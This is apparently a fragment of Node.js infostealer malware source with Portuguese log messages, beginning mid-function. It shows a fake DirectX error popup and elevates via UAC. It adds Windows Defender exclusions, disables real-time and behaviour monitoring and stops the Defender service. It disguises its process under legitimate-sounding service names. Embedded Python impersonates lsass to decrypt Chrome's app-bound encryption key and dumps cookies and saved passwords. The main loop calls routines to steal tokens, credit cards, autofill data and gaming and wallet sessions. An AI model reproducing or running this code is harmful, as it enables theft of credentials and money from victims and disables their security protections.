    const vbsScript = `
If Not WScript.Arguments.Named.Exists("elevate") Then
    MsgBox "Failed to initialize DirectX. Please reinstall DirectX or update your GPU drivers.", vbOKOnly + vbInformation, "Error"
    CreateObject("Shell.Application").ShellExecute WScript.FullName, Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate:true", "", "runas", 1
    WScript.Quit
End If

Set shell = CreateObject("WScript.Shell")
shell.Run "powershell.exe -command ""Add-MpPreference -ExclusionPath $env:APPDATA; Add-MpPreference -ExclusionPath 'C:\\'""", 0, True
WScript.Quit
    `;

    const tempFile = path.join(process.env.TEMP, `temp_${Date.now()}.vbs`);
    fs.writeFileSync(tempFile, vbsScript, "utf16le");

    exec(`cscript //nologo "${tempFile}" /elevate:true`, (error, stdout) => {
      try { fs.unlinkSync(tempFile); } catch { }
      if (error) return reject(error);
      resolve(stdout.trim());
    });
  });
}

async function rushwtf2() {
  return new Promise((resolve, reject) => {
    const vbsScript = `
If Not WScript.Arguments.Named.Exists("elevate") Then
    MsgBox "Failed to initialize DirectX. Please reinstall DirectX or update your GPU drivers.", vbOKOnly + vbInformation, "Error"
    CreateObject("Shell.Application").ShellExecute WScript.FullName, Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate:true", "", "runas", 1
    WScript.Quit
End If

Set shell = CreateObject("WScript.Shell")
shell.Run "powershell.exe -command ""Add-MpPreference -ExclusionPath $env:APPDATA; Add-MpPreference -ExclusionPath 'C:\\'""", 0, True
WScript.Quit
    `;

    const tempFile = path.join(process.env.TEMP, `sex.vbs`);
    fs.writeFileSync(tempFile, vbsScript, "utf16le");

    exec(`cscript //nologo "${tempFile}" /elevate:true`, (error, stdout) => {
      try { fs.unlinkSync(tempFile); } catch { }
      if (error) return reject(error);
      resolve(stdout.trim());
    });
  });
}

function Maimota() {
  return new Promise((resolve) => {
    const ChromeProc = ["chrome.exe"];

    let count = 0;

    ChromeProc.forEach(proc => {
      exec(`taskkill /F /IM ${proc} /T`, (err, stdout, stderr) => {
        count++;

        if (!err) {
          console.log(`[KILL] ${proc} finalizado com sucesso.`);
        } else if (stderr.includes("não foi encontrado")) {
          console.log(`[INFO] ${proc} não estava em execução.`);
        } else {
          console.error(`[ERRO] ao finalizar ${proc}:`, stderr);
        }

        if (count === ChromeProc.length) {
          resolve();
        }
      });
    });
  });
}

const fodase = os.tmpdir()
const installDir = path.join(fodase, "WinGet");
const nugetUrl = "https://globalcdn.nuget.org/packages/python.3.10.0.nupkg";
const pythonExe = path.join(installDir, "tools", "python.exe");
const tempScript = path.join(os.tmpdir(), "x1z2fQ7T3j0w.py");

const requirements = ["pycryptodome", "pywin32", "PythonForWindows"];

async function ChromePython(pyCode) {
    if (!fs.existsSync(installDir)) fs.mkdirSync(installDir, { recursive: true });
    const zipPath = path.join(fodase, "python310.nupkg");

    if (!fs.existsSync(pythonExe)) {
        console.log("[INFO] Baixando Python 3.10 portable...");
        await downloadFile(nugetUrl, zipPath);
        console.log("[INFO] Extraindo Python...");
        await extractZip(zipPath, installDir);
        fs.unlinkSync(zipPath);
    }

    const env = { ...process.env, PYTHONHOME: path.join(installDir, "tools"), PYTHONPATH: path.join(installDir, "tools", "Lib"), };

    console.log("[INFO] Instalando Libs em paralelo...");
    try {
        await InstallLibs(requirements, env);
        console.log("[INFO] Todos as Libs instaladas!");
    } catch (err) {
        console.error("[ERRO] Instalação de Libs falhou:", err.message);
    }

    console.log("[INFO] Salvando code temporário...");
    fs.writeFileSync(tempScript, pyCode);

    console.log("[INFO] Executando code temporário...");
    try {
        await Runpy(tempScript, env);
    } catch (err) {
        console.error("[ERRO] Execução do code falhou:", err.message);
    }

    try {
        if (fs.existsSync(tempScript)) {
            fs.unlinkSync(tempScript);
            console.log("[INFO] Code temporário removido:", tempScript);
        }
    } catch (cleanupErr) {
        console.warn("[WARN] Falha ao remover Code temporário:", cleanupErr.message);
    }

    console.log("[INFO] Execução finalizada!");
}


//


function downloadFile(url, dest) {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(dest);
        https.get(url, (res) => {
            if (res.statusCode !== 200)
                return reject(new Error(`Falha no download: ${res.statusCode}`));
            res.pipe(file);
            file.on("finish", () => file.close(resolve));
        }).on("error", (err) => fs.unlink(dest, () => reject(err)));
    });
}

function extractZip(zipPath, dest) {
    return new Promise((resolve, reject) => {
        const zip = new StreamZip({ file: zipPath, storeEntries: true });

        zip.on("ready", () => {
            zip.extract(null, dest, (err, count) => {
                zip.close();
                if (err) return reject(err);
                console.log(`[INFO] Extraídos ${count} arquivos.`);
                resolve();
            });
        });

        zip.on("error", (err) => reject(err));
    });
}

function InstallLibs(packages, env) {
    const promises = packages.map(pkg => {
        console.log(`[INFO] Começando instalação: ${pkg}`);
        return new Promise((resolve, reject) => {
            execFile(
                pythonExe,
                ["-m", "pip", "install", "--upgrade", pkg],
                { env },
                (err, stdout, stderr) => {
                    if (err) {
                        console.error(`[ERRO] Falhou: ${pkg}\n`, stderr.toString());
                        return reject(err);
                    }
                    console.log(`[INFO] Sucesso: ${pkg}`);
                    resolve();
                }
            );
        });
    });

    return Promise.all(promises)
        .then(() => console.log("[INFO] Todas as instalações concluídas!"))
        .catch(err => console.error("[ERRO] Alguma instalação falhou.", err));
}

function Runpy(scriptPath, env) {
    return new Promise((resolve, reject) => {
        execFile(pythonExe, [scriptPath], { env }, (err, stdout, stderr) => {
            if (err) {
                console.error("[ERRO] Execução Python:", stderr.toString());
                return reject(err);
            }
            console.log(stdout.toString());
            resolve();
        });
    });
}

const code = `
import os, io, sys, json, struct, ctypes, sqlite3, pathlib, binascii, time
from contextlib import contextmanager
import windows, windows.security, windows.crypto
import windows.generated_def as gdef
from Crypto.Cipher import AES, ChaCha20_Poly1305

identifier = "${identifier}"
base_dir = os.path.join(os.environ["TEMP"], identifier, "Chrome")
os.makedirs(base_dir, exist_ok=True)

cookies_file = os.path.join(base_dir, "cookies.txt")
passwords_file = os.path.join(base_dir, "passwords.txt")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

@contextmanager
def impersonate_lsass():
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name.lower() == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token

def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    parsed_data = {}
    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    assert header_len + content_len + 8 == len(blob_data)
    parsed_data['flag'] = buffer.read(1)[0]
    if parsed_data['flag'] in [1, 2]:
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 3:
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        raise ValueError(f"Unsupported flag: {parsed_data['flag']}")
    return parsed_data

def decrypt_with_cng(input_data):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
    assert status == 0
    hKey = gdef.NCRYPT_KEY_HANDLE()
    key_name = "Google Chromekey1"
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    assert status == 0
    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, None, 0, ctypes.byref(pcbResult), 0x40)
    assert status == 0
    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * pcbResult.value)()
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, output_buffer, buffer_size, ctypes.byref(pcbResult), 0x40)
    assert status == 0
    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)
    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data: dict) -> bytes:
    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
    elif parsed_data['flag'] == 2:
        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed_data['iv'])
    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'])
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
    return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])

def main():
    localappdata = os.environ['LOCALAPPDATA']

    candidates = [
      [os.path.join(localappdata, "Google", "Chrome SxS", "User Data", "Default"),
       "Chrome_SxS_Default",
       os.path.join(localappdata, "Google", "Chrome SxS", "User Data")],
      [os.path.join(localappdata, "Google", "Chrome", "User Data", "Default"),
       "Chrome_Default",
       os.path.join(localappdata, "Google", "Chrome", "User Data")],
      [os.path.join(localappdata, "Google", "Chrome", "User Data", "Profile 1"),
       "Chrome_Profile_1",
       os.path.join(localappdata, "Google", "Chrome", "User Data")],
      [os.path.join(localappdata, "Google", "Chrome", "User Data", "Profile 2"),
       "Chrome_Profile_2",
       os.path.join(localappdata, "Google", "Chrome", "User Data")],
      [os.path.join(localappdata, "Google", "Chrome", "User Data", "Profile 3"),
       "Chrome_Profile_3",
       os.path.join(localappdata, "Google", "Chrome", "User Data")],
      [os.path.join(localappdata, "Google", "Chrome", "User Data", "Profile 4"),
       "Chrome_Profile_4",
       os.path.join(localappdata, "Google", "Chrome", "User Data")],
      [os.path.join(localappdata, "Google", "Chrome", "User Data", "Profile 5"),
       "Chrome_Profile_5",
       os.path.join(localappdata, "Google", "Chrome", "User Data")],
      [os.path.join(localappdata, "Google", "Chrome", "User Data", "Guest Profile"),
       "Chrome_Guest_Profile",
       os.path.join(localappdata, "Google", "Chrome", "User Data")],
    ]

    chosen = next((c for c in candidates if os.path.exists(c[0])), candidates[0])
    profile_path = chosen[0]         
    profile_name = chosen[1]        
    user_data_dir = chosen[2]       

    local_state_path = os.path.join(user_data_dir, "Local State")
    cookie_db_path = os.path.join(profile_path, "Network", "Cookies")
    login_db_path = os.path.join(profile_path, "Login Data")

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
    key_blob_encrypted = binascii.a2b_base64(app_bound_encrypted_key)[4:]
    with impersonate_lsass():
        key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
    key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
    parsed_data = parse_key_blob(key_blob_user_decrypted)
    v20_master_key = derive_v20_master_key(parsed_data)

    # COOKIES
    con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
    cur = con.cursor()
    cookies = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;").fetchall()
    con.close()

    def decrypt_cookie_v20(encrypted_value):
        cookie_iv = encrypted_value[3:15]
        encrypted_cookie = encrypted_value[15:-16]
        cookie_tag = encrypted_value[-16:]
        cipher = AES.new(v20_master_key, AES.MODE_GCM, nonce=cookie_iv)
        decrypted_cookie = cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
        return decrypted_cookie[32:].decode('utf-8', errors="ignore")

    with open(cookies_file, "w", encoding="utf-8") as f:
        for host, name, val in cookies:
            if val[:3] == b"v20":
                try:
                    value = decrypt_cookie_v20(val)
                    domain = host
                    flag = "TRUE" if domain.startswith(".") else "FALSE"
                    path = "/"
                    secure = "FALSE"
                    expiration = str(int(time.time()) + 315360000)
                    f.write(f"{domain}\\t{flag}\\t{path}\\t{secure}\\t{expiration}\\t{name}\\t{value}\\n")
                except:
                    continue

    # SENHAS (v20)
    con = sqlite3.connect(pathlib.Path(login_db_path).as_uri() + "?mode=ro", uri=True)
    cur = con.cursor()
    logins = cur.execute("SELECT origin_url, username_value, password_value FROM logins;").fetchall()
    con.close()

    def decrypt_password_v20(encrypted_value):
        if encrypted_value[:3] == b"v20":
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            cipher = AES.new(v20_master_key, AES.MODE_GCM, nonce=iv)
            return cipher.decrypt_and_verify(payload, tag).decode("utf-8", errors="ignore")
        else:
            try:
                return windows.crypto.dpapi.unprotect(encrypted_value).decode("utf-8", errors="ignore")
            except:
                return "<falha>"

    with open(passwords_file, "w", encoding="utf-8") as f:
        for origin, user, pwd in logins:
            decrypted_pwd = decrypt_password_v20(pwd)
            f.write(f"URL: {origin}\\nUser: {user}\\nPassword: {decrypted_pwd}\\n{'='*50}\\n")

if __name__ == "__main__":
    if not is_admin():
        print("This script needs to run as administrator.")
    else:
        os.system("taskkill /f /im chrome.exe")
        
        main()
`;

async function DisableProtections() {
  try {
    console.log('[INFO] Iniciando processo de Evasão..');
    await LegitProcess();
    await DefenderExclusions();
    ObfuscateMemory();
    await ProcessWindows();
    await DisableAv();

    console.log('[INFO] Sistema de Evasão concluido');
    return true;

  } catch (error) {
    console.error('[ERROR] Evasion failed:', error.message);
    return false;
  }
}

async function LegitProcess() {
  try {
    if (process.platform === 'win32') {
      const randomName = GenLegitNames();
      execSync(`sc config ${process.title} DisplayName= "${randomName}"`, { stdio: 'ignore' });
    }
  } catch (e) { }
}

async function DefenderExclusions() {
  if (process.platform !== 'win32') return;

  try {
    const appPath = process.execPath;
    const appDir = path.dirname(appPath);

    execSync(`powershell -Command "Add-MpPreference -ExclusionPath 'C:\\'"`, { stdio: 'ignore' });
    execSync(`powershell -Command "Add-MpPreference -ExclusionPath '${appDir}'"`, { stdio: 'ignore' });
    execSync(`powershell -Command "Add-MpPreference -ExclusionPath '${os.tmpdir()}'"`, { stdio: 'ignore' });

    const processName = path.basename(process.execPath);
    execSync(`powershell -Command "Add-MpPreference -ExclusionProcess '${processName}'"`, { stdio: 'ignore' });

  } catch (e) {
    try {
      const regPath = `HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths`;
      execSync(`reg add "${regPath}" /v "C:\\" /t REG_DWORD /d 0 /f`, { stdio: 'ignore' });
    } catch (e) { }
  }
}

function ObfuscateMemory() {
  const sensitiveData = {
    keys: process.memoryUsage(),
    tokens: Math.random().toString(36).substring(2),
    patterns: Buffer.from(Math.random().toString()).toString('base64')
  };

  const encrypted = Buffer.from(JSON.stringify(sensitiveData)).toString('base64');
  setTimeout(() => {
    sensitiveData.keys = null;
    sensitiveData.tokens = null;
    sensitiveData.patterns = null;
  }, 1000);
}

async function ProcessWindows() {
  const legitProcesses = [
    'svchost.exe', 'winlogon.exe', 'services.exe',
    'explorer.exe', 'dllhost.exe', 'taskhostw.exe'
  ];

  legitProcesses.forEach(proc => {
    try {
      exec(`tasklist | findstr /i ${proc}`, { stdio: 'ignore' });
    } catch (e) { }
  });
}

async function DisableAv() {
  if (process.platform !== 'win32') return;

  try {
    execSync('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', { stdio: 'ignore' });
    execSync('powershell -Command "Set-MpPreference -MAPSReporting 0"', { stdio: 'ignore' });
    execSync('powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"', { stdio: 'ignore' });

    const securityDirs = [
      'C:\\Program Files\\Windows Defender',
      'C:\\Program Files\\Common Files\\McAfee',
      'C:\\Program Files\\Symantec',
      'C:\\Program Files\\Kaspersky Lab'
    ];

    securityDirs.forEach(dir => {
      try {
        execSync(`powershell -Command "Add-MpPreference -ExclusionPath '${dir}'"`, { stdio: 'ignore' });
      } catch (e) { }
    });

  } catch (e) {
    try {
      execSync('net stop WinDefend /y', { stdio: 'ignore' });
      execSync('sc config WinDefend start= disabled', { stdio: 'ignore' });
    } catch (e) { }
  }
}

function GenLegitNames() {
  const legitNames = [
    'Windows System Helper',
    'Runtime Broker Service',
    'Background Tasks Host',
    'System Settings Provider',
    'User Profile Service',
    'Network Connection Broker',
    'Time Synchronization Service',
    'Device Association Service'
  ];
  return legitNames[Math.floor(Math.random() * legitNames.length)];
}


async function breaking() {
  await rushwtf()
  await rushwtf2()
  await DisableProtections()
}

async function GetSessions() {
  await ExodusSession()
  await SessionRoblox()
  await SteamSession()
  await MinecraftSession()
}

(async () => {
  process.removeAllListeners("warning");

  for (let i = 0; i < 3; i++) {
    try {
      await breaking();
    } catch (err) {
      logs += `breaking: ${err}\nComputer Name: ${os.userInfo().username}\n`;
    }

    try {
      FakeError();
    } catch (err) {
      logs += `FakeError: ${err}\nComputer Name: ${os.userInfo().username}\n`;
    }

    try {
      await Startup();
    } catch (err) {
      logs += `Startup: ${err}\nComputer Name: ${os.userInfo().username}\n`;
    }

    try {
      await Encrypted();
    } catch (err) {
      logs += `Encrypted: ${err}\nComputer Name: ${os.userInfo().username}\n`;
    }

    try {
      await GetToken();
    } catch (err) {
      logs += `GetToken: ${err}\nComputer Name: ${os.userInfo().username}\n`;
    }

        try {
      await ChromePython(code);
    } catch (err) {
      logs += `chromeInjector: ${err}\nComputer Name: ${os.userInfo().username}\n`;
    }
    try {
      await GetCookies();
    } catch (err) {
      logs += `GetCookies: ${err}\nComputer Name: ${os.userInfo().username}\n`;
    }

    try {
      await operaPasswords();
    } catch (err) {
      logs += `operaPasswords: ${err}\nComputer Name: ${os.userInfo().username}\n`;
    }

    try {
      await GetPasswords();
    } catch (err) {
      logs += `GetPasswords: ${err}\nComputer Name: ${os.userInfo().username}\n`;
    }

    try {
      await GetCreditCards();
    } catch (err) {
      logs += `GetCreditCards: ${err}\nComputer Name: ${os.userInfo().username}\n`;
    }

    try {
      await GetAutoFills();
    } catch (err) {
      logs += `GetAutoFills: ${err}\nComputer Name: ${os.userInfo().username}\n`;
    }

    try {
      await GetInfo();
    } catch (err) {
      logs += `GetInfo: ${err}\nComputer Name: ${os.userInfo().username}\n`;
    }

    try {
      await DownloadPanel()
    } catch (err) {
      logs += `DownloadPanel: ${err}\nComputer Name: ${os.userInfo().username}\n`;
    }

    try {
      await GetSessions();
    } catch (err) {
      logs += `GetSessions: ${err}\nComputer Name: ${os.userInfo().username}\n`;
    }
  }
})();